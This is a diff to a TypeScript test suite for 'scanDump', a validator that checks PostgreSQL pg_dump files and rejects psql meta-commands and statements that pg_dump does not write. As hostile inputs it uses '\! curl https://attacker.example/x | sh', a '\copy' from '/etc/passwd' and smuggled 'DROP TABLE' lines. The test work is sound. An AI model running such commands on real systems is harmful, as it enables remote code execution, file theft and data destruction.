@@ -16,6 +16,18 @@ function dumpFile(text: string): string {
   return path
 }
 
+/** A body between pg_dump's \restrict / \unrestrict pair. */
+const wrap = (...lines: string[]): string =>
+  ['\\restrict K3y', ...lines, '\\unrestrict K3y', ''].join('\n')
+
+/** The error scanDump rejects with, as text (null when it resolves). */
+async function failure(text: string): Promise<string | null> {
+  return scanDump(dumpFile(text)).then(
+    () => null,
+    (caught: unknown) => String(caught),
+  )
+}
+
 describe('scanDump', () => {
   it('counts the rows of every COPY block, empty blocks included', async () => {
     const scan = await scanDump(dumpFile(PUBLIC_DUMP))
@@ -30,53 +42,112 @@ describe('scanDump', () => {
 
   it('reads a dump larger than one stream chunk, with a multi-byte character across chunks', async () => {
     const rows = Array.from({ length: 30_000 }, (_, index) => `${index}\tHọc Đều ${'ư'.repeat(7)}`)
-    const text = ['COPY public.events (id, note) FROM stdin;', ...rows, '\\.', ''].join('\n')
+    const text = wrap('COPY public.events (id, note) FROM stdin;', ...rows, '\\.')
     const scan = await scanDump(dumpFile(text))
     expect(scan.rows).toEqual({ 'public.events': 30_000 })
     expect(scan.sha256).toBe(createHash('sha256').update(text).digest('hex'))
   })
 
   it('reads auth tables', async () => {
-    const text = [
+    const text = wrap(
       'COPY auth.users (id) FROM stdin;',
       'a',
       '\\.',
       'COPY auth.identities (id) FROM stdin;',
       '\\.',
-      '',
-    ].join('\n')
+    )
     expect((await scanDump(dumpFile(text))).rows).toEqual({ 'auth.users': 1, 'auth.identities': 0 })
   })
 
-  it('rejects any psql meta-command but the \\restrict pair outside COPY data, without echoing it', async () => {
-    // PUBLIC_DUMP ends with a newline, so the appended command is its last line.
-    const lineNumber = PUBLIC_DUMP.split('\n').length
-    const path = dumpFile(`${PUBLIC_DUMP}\\! curl https://attacker.example/x | sh\n`)
-    const error = await scanDump(path).then(
-      () => null,
-      (caught: unknown) => String(caught),
-    )
-    expect(error).toMatch(new RegExp(`line ${lineNumber}\\b`))
-    expect(error).toMatch(/meta-command/)
+  it('accepts what pg_dump writes outside COPY data: comments, SET, set_config, setval', async () => {
+    const text = [
+      '--',
+      '-- PostgreSQL database dump',
+      '--',
+      '',
+      '\\restrict K3y',
+      '-- Dumped by pg_dump version 17.6',
+      'SET statement_timeout = 0;',
+      'SET transaction_timeout = 0;',
+      "SET client_encoding = 'UTF8';",
+      'SET standard_conforming_strings = on;',
+      "SELECT pg_catalog.set_config('search_path', '', false);",
+      'SET row_security = off;',
+      'COPY public.ops_metrics (id, key) FROM stdin;',
+      '1\tdb.size_bytes',
+      '\\.',
+      "SELECT pg_catalog.setval('public.ops_metrics_id_seq', 802, true);",
+      '--',
+      '-- PostgreSQL database dump complete',
+      '--',
+      '',
+      '\\unrestrict K3y',
+      '',
+      '',
+    ].join('\n')
+    expect((await scanDump(dumpFile(text))).rows).toEqual({ 'public.ops_metrics': 1 })
+  })
+
+  it('rejects a psql meta-command outside COPY data, without echoing it', async () => {
+    const error = await failure(wrap('SET x = 1;', '\\! curl https://attacker.example/x | sh'))
+    expect(error).toMatch(/line 3\b.*backslash outside COPY data/)
     expect(error).not.toContain('attacker')
   })
 
+  it('rejects a backslash in the middle of a line (a meta-command after a statement)', async () => {
+    const error = await failure(wrap('SET statement_timeout = 0; \\! id'))
+    expect(error).toMatch(/line 2\b.*backslash outside COPY data/)
+  })
+
+  it('rejects a backslash even inside a comment line', async () => {
+    expect(await failure(wrap('-- a comment \\! id'))).toMatch(/line 2\b.*backslash/)
+  })
+
   it.each([
-    ['\\restrict with no key', '\\restrict\n'],
-    ['\\connect', '\\connect other\n'],
-    ['\\copy', "\\copy public.profiles from '/etc/passwd'\n"],
-  ])('rejects %s', async (_label, line) => {
-    await expect(scanDump(dumpFile(`${PUBLIC_DUMP}${line}`))).rejects.toThrow(/meta-command/)
+    ['\\connect', '\\connect other'],
+    ['\\copy', "\\copy public.profiles from '/etc/passwd'"],
+    ['a second \\restrict', '\\restrict Other'],
+    ['an early \\unrestrict', '\\unrestrict K3y'],
+  ])('rejects %s between the \\restrict pair', async (_label, line) => {
+    expect(await failure(wrap('SET x = 1;', line, 'SET y = 2;'))).toMatch(/line 3\b/)
+  })
+
+  it('requires \\restrict <key> as the first statement', async () => {
+    const noRestrict = ['SET x = 1;', 'COPY public.events (id) FROM stdin;', '\\.', ''].join('\n')
+    expect(await failure(noRestrict)).toMatch(/line 1\b.*\\restrict/)
+    expect(await failure(`SET x = 1;\n${wrap()}`)).toMatch(/line 1\b.*\\restrict/)
+    expect(await failure(wrap().replace('\\restrict K3y', '\\restrict'))).toMatch(/\\restrict/)
+  })
+
+  it('requires \\unrestrict with the same key as the last statement', async () => {
+    const truncated = ['\\restrict K3y', 'COPY public.events (id) FROM stdin;', '\\.', ''].join(
+      '\n',
+    )
+    expect(await failure(truncated)).toMatch(/does not end with \\unrestrict/)
+    expect(await failure(wrap().replace('\\unrestrict K3y', '\\unrestrict Other'))).toMatch(
+      /line 2\b.*key/,
+    )
+    expect(await failure(`${wrap()}SET x = 1;\n`)).toMatch(/line 3\b.*after \\unrestrict/)
+  })
+
+  it.each([
+    ['a DROP', 'DROP TABLE public.profiles;'],
+    ['a function', 'CREATE FUNCTION public.f() RETURNS int LANGUAGE sql AS $$ select 1 $$;'],
+    ['an INSERT', "INSERT INTO public.profiles (id) VALUES ('x');"],
+    ['a SET with more after it', 'SET x = 1; DROP TABLE public.profiles;'],
+    ['a SELECT other than set_config and setval', 'SELECT pg_catalog.pg_sleep(1);'],
+  ])('rejects any other statement outside COPY data: %s', async (_label, line) => {
+    expect(await failure(wrap(line))).toMatch(/line 2\b.*not something pg_dump writes/)
   })
 
   it('rejects a COPY block that never ends (a truncated dump)', async () => {
-    const text = ['COPY public.events (id) FROM stdin;', '1', '2', ''].join('\n')
-    await expect(scanDump(dumpFile(text))).rejects.toThrow(/public\.events.*never ends/)
+    const text = ['\\restrict K3y', 'COPY public.events (id) FROM stdin;', '1', '2', ''].join('\n')
+    expect(await failure(text)).toMatch(/public\.events.*never ends/)
   })
 
   it('rejects a table copied twice', async () => {
-    const block = ['COPY public.events (id) FROM stdin;', '1', '\\.', ''].join('\n')
-    await expect(scanDump(dumpFile(block + block))).rejects.toThrow(/public\.events.*twice/)
+    const block = ['COPY public.events (id) FROM stdin;', '1', '\\.']
+    expect(await failure(wrap(...block, ...block))).toMatch(/public\.events.*twice/)
   })
 
   it.each([
@@ -84,7 +155,7 @@ describe('scanDump', () => {
     ['a table without a schema', 'COPY events (id) FROM stdin;'],
     ['COPY from a file', "COPY public.events (id) FROM '/tmp/x';"],
   ])('rejects a COPY statement it does not recognise: %s', async (_label, line) => {
-    await expect(scanDump(dumpFile(`${line}\n\\.\n`))).rejects.toThrow(/line 1.*COPY/)
+    expect(await failure(wrap(line, '\\.'))).toMatch(/line 2\b.*COPY/)
   })
 
   it('rejects a missing file', async () => {
